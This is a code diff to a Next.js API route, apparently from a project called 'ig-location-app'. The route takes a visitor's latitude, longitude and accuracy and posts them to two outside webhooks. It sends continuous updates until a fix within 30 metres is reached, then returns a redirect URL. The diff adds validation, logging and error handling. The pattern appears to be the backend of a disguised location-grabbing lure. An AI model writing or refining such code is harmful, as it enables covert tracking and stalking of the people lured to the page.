@@ -54,7 +54,7 @@ function buildPayload(body: any, eventType: string) {
     },
     metadata: {
       source: 'ig-location-app',
-      version: '1.0.0',
+      version: '2.0.0',
     },
   };
 }
@@ -62,24 +62,36 @@ function buildPayload(body: any, eventType: string) {
 export async function POST(request: NextRequest) {
   try {
     const body = await request.json();
-    const { type } = body; // "update" for webhook2 (continuous), "final" for webhook1 (precise)
+    const { type, latitude, longitude, accuracy } = body;
+
+    // Validate required fields
+    if (!latitude || !longitude || !accuracy) {
+      console.error('[API] Missing required location fields:', { latitude, longitude, accuracy });
+      return NextResponse.json(
+        { error: 'Missing required location fields', received: { latitude, longitude, accuracy } },
+        { status: 400 }
+      );
+    }
+
+    console.log(`[API] Received ${type} request - lat: ${latitude}, lng: ${longitude}, accuracy: ${accuracy}m`);
 
     const redirectUrl = process.env.REDIRECT_URL;
+    const webhookUrl = process.env.WEBHOOK_URL;
+    const webhookUrl2 = process.env.WEBHOOK_URL_2;
 
     if (type === 'update') {
       // ===== WEBHOOK 2: Continuous location updates =====
-      const webhookUrl2 = process.env.WEBHOOK_URL_2;
-
       if (webhookUrl2) {
         const payload = buildPayload(body, 'location_update');
-        console.log(`[Webhook 2] Sending location update (attempt ${body.attemptNumber}, accuracy: ${body.accuracy}m)`);
+        console.log(`[Webhook 2] Sending location update (attempt ${body.attemptNumber}, accuracy: ${accuracy}m)`);
 
         try {
-          await fetch(webhookUrl2, {
+          const res = await fetch(webhookUrl2, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload),
           });
+          console.log(`[Webhook 2] Response: ${res.status} ${res.statusText}`);
         } catch (err) {
           console.error('[Webhook 2] Failed:', err);
         }
@@ -90,61 +102,64 @@ export async function POST(request: NextRequest) {
       return NextResponse.json({
         success: true,
         type: 'update',
-        accuracy: body.accuracy,
-        meetsThreshold: body.accuracy <= 30,
+        accuracy: accuracy,
+        meetsThreshold: accuracy <= 30,
+        webhook2Sent: !!webhookUrl2,
       });
     }
 
     // ===== WEBHOOK 1: Final precise location (accuracy < 30m) =====
-    const webhookUrl = process.env.WEBHOOK_URL;
-
     if (!webhookUrl) {
       console.error('[Webhook 1] WEBHOOK_URL not configured in .env');
       return NextResponse.json(
-        { error: 'Webhook URL not configured' },
+        { error: 'Webhook URL not configured', hint: 'Set WEBHOOK_URL in .env' },
         { status: 500 }
       );
     }
 
     const payload = buildPayload(body, 'location_captured');
-    console.log(`[Webhook 1] Sending FINAL location (accuracy: ${body.accuracy}m)`);
+    console.log(`[Webhook 1] Sending FINAL location (accuracy: ${accuracy}m) to ${webhookUrl.substring(0, 50)}...`);
 
-    const webhookResponse = await fetch(webhookUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload),
-    });
+    let webhookOk = false;
+    try {
+      const webhookResponse = await fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+      });
+      webhookOk = webhookResponse.ok;
+      console.log(`[Webhook 1] Response: ${webhookResponse.status} ${webhookResponse.statusText}`);
+    } catch (err) {
+      console.error('[Webhook 1] Fetch failed:', err);
+    }
 
     // Also send to webhook 2 as final update
-    const webhookUrl2 = process.env.WEBHOOK_URL_2;
     if (webhookUrl2) {
       try {
         const finalPayload = buildPayload(body, 'location_final');
-        await fetch(webhookUrl2, {
+        const res2 = await fetch(webhookUrl2, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(finalPayload),
         });
+        console.log(`[Webhook 2] Final update response: ${res2.status}`);
       } catch (err) {
         console.error('[Webhook 2] Final update failed:', err);
       }
-    }
-
-    if (!webhookResponse.ok) {
-      console.error('[Webhook 1] Failed:', webhookResponse.status);
     }
 
     return NextResponse.json({
       success: true,
       type: 'final',
       redirectUrl: redirectUrl || null,
-      webhookStatus: webhookResponse.ok ? 'sent' : 'failed',
-      accuracy: body.accuracy,
+      webhookStatus: webhookOk ? 'sent' : 'failed',
+      accuracy: accuracy,
+      webhook1Url: webhookUrl.substring(0, 30) + '...',
     });
   } catch (error) {
-    console.error('Location API error:', error);
+    console.error('[API] Location API error:', error);
     return NextResponse.json(
-      { error: 'Internal server error' },
+      { error: 'Internal server error', details: String(error) },
       { status: 500 }
     );
   }
